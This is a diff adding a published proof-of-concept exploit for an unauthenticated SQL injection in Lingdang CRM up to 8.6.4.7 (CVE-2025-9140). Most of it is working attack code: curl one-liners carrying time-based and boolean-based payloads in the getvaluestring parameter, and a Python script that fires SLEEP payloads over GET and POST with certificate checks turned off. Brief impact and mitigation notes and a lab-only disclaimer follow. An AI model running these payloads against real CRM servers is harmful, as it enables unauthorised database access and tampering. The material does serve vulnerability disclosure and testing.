@@ -1,0 +1,89 @@
+# Exploit Title: Lingdang CRM 8.6.4.7 - SQL Injection
+# Google Dork: N/A
+# Date: 2025-08-19
+# Exploit Author: Beatriz Fresno Naumova
+# Vendor: Shanghai Lingdang Information Technology)
+# Software Link: (N/A – commercial product)
+# Version: <= 8.6.4.7 (fixed in 8.6.5.x per vendor advisory)
+# Tested on: Generic LAMP stack, PHP 7/8 (PoC uses HTTP only; no OS dependency)
+# CVE : CVE-2025-9140
+
+# Summary
+# The endpoint /crm/crmapi/erp/tabdetail_moduleSave.php is vulnerable to SQL injection via the
+# 'getvaluestring' parameter. An unauthenticated remote attacker can perform boolean/time-based
+# blind SQL injection. Vendor states this was fixed by adopting parameterized queries in v8.6.5+.
+
+# Route
+#   /crm/crmapi/erp/tabdetail_moduleSave.php
+# Parameter
+#   getvaluestring (GET or POST)
+
+# Notes
+# * This PoC does NOT target a live site. Replace TARGET with a lab host you own.
+# * Demonstrates time-based blind (SLEEP) and boolean-based payloads.
+
+# --- Quick PoC with curl (time-based blind) ---
+# Expect ~5s response delay on vulnerable targets.
+
+# GET variant:
+curl -i -k "http://TARGET/crm/crmapi/erp/tabdetail_moduleSave.php?getvaluestring='||(SELECT SLEEP(5))--+-"
+
+# POST variant:
+curl -i -k -X POST "http://TARGET/crm/crmapi/erp/tabdetail_moduleSave.php" \
+  --data "getvaluestring='||(SELECT SLEEP(5))--+-"
+
+# --- Boolean-based example (response/body differences may vary by deployment) ---
+curl -s -k "http://TARGET/crm/crmapi/erp/tabdetail_moduleSave.php?getvaluestring=' OR 1=1-- -" -o /tmp/true.html
+curl -s -k "http://TARGET/crm/crmapi/erp/tabdetail_moduleSave.php?getvaluestring=' OR 1=2-- -" -o /tmp/false.html
+# Compare /tmp/true.html vs /tmp/false.html for observable differences.
+
+# --- Python 3 PoC (time-based) ---
+# Save as lingdang_sqli_poc.py and run:  python3 lingdang_sqli_poc.py http://TARGET
+
+import sys, time, requests
+
+def test_time_sqli(base):
+    url_get = f"{base.rstrip('/')}/crm/crmapi/erp/tabdetail_moduleSave.php"
+    payload = "'||(SELECT SLEEP(5))--+-"
+    try:
+        t0 = time.time()
+        r = requests.get(url_get, params={"getvaluestring": payload}, timeout=30, verify=False)
+        dt = time.time() - t0
+        print(f"[+] GET status={r.status_code} elapsed={dt:.2f}s")
+        if dt >= 5:
+            print("[+] Likely vulnerable to time-based SQLi via GET.")
+        else:
+            print("[-] No significant delay observed via GET.")
+    except Exception as e:
+        print(f"[!] GET error: {e}")
+
+    try:
+        t0 = time.time()
+        r = requests.post(url_get, data={"getvaluestring": payload}, timeout=30, verify=False)
+        dt = time.time() - t0
+        print(f"[+] POST status={r.status_code} elapsed={dt:.2f}s")
+        if dt >= 5:
+            print("[+] Likely vulnerable to time-based SQLi via POST.")
+        else:
+            print("[-] No significant delay observed via POST.")
+    except Exception as e:
+        print(f"[!] POST error: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} http://TARGET")
+        sys.exit(1)
+    requests.packages.urllib3.disable_warnings()
+    test_time_sqli(sys.argv[1])
+
+# --- Impact ---
+# Confidentiality, integrity, availability compromise via SQL injection (CWE-89).
+
+# --- Mitigations ---
+# 1) Use parameterized queries / prepared statements for getvaluestring.
+# 2) Server-side input validation and allow-listing for the parameter.
+# 3) Web Application Firewall (WAF) rules to block SQLi patterns on this route.
+
+# --- Disclosure ---
+# Public identifiers: CVE-2025-9140 (VulDB VDB-320520).
+# Vendor reportedly fixed in 8.6.5+ with parameterized queries.
